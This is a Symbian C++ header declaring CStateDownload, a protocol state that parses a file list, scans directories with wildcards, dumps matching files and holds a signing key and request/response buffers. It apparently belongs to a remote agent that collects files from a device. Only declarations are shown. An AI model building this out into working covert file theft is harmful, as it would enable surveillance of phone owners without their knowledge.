/*
 * StateDownload.h
 *
 *  Created on: 23/feb/2011
 *      Author: Giovanna
 */

#ifndef STATEDOWNLOAD_H_
#define STATEDOWNLOAD_H_

// INCLUDES
#include <e32std.h>
#include <e32base.h>
#include <f32file.h>
#include <BADESCA.H>
#include <HT\LongRunTask.h>

#include "AbstractState.h"

// CLASS DECLARATION


/**
 *  CStateDownload
 * 
 */
class CStateDownload : public CAbstractState, public MLongTaskCallBack
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CStateDownload();

	/**
	 * Two-phased constructor.
	 */
	static CStateDownload* NewL(MStateObserver& aObserver);

	/**
	 * Two-phased constructor.
	 */
	static CStateDownload* NewLC(MStateObserver& aObserver);

	virtual void ActivateL(const TDesC8& aData);
	virtual void ProcessDataL(const TDesC8& aData);
	
private:

	/**
	 * Constructor for performing 1st stage construction
	 */
	CStateDownload(MStateObserver& aObserver);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL();
	
	// from MLongTaskCallBack
	virtual void DoOneRoundL();
	
	// internal methods
	void FindFilesL(const TDesC8& aFileList, CDesCArrayFlat* aFileArray);
	void StartScanL(RFs& aFs,const TDesC& aSearchString, CDesCArray* aFileArray);
	void ScanDirectory(RFs& aFs, const TDesC& aDir, const TDesC& aWild, CDesCArray* aFileArray);
	void DumpFileL(const TDesC& aFileName);
	TBool MalformedPath(const TDesC& aPath);



private:
	CLongTaskAO* 	iLongTask;
	TBool 			iStopLongTask;
	TInt			iFileIndex;
	
	TBuf8<16>		iSignKey;
	HBufC8*			iRequestData;
	HBufC8*			iResponseData;
	
	RFs				iFs;
	CDesCArrayFlat*	iFilesArray;
	
	TFullName		iPrivatePath;
	};

#endif /* STATEDOWNLOAD_H_ */
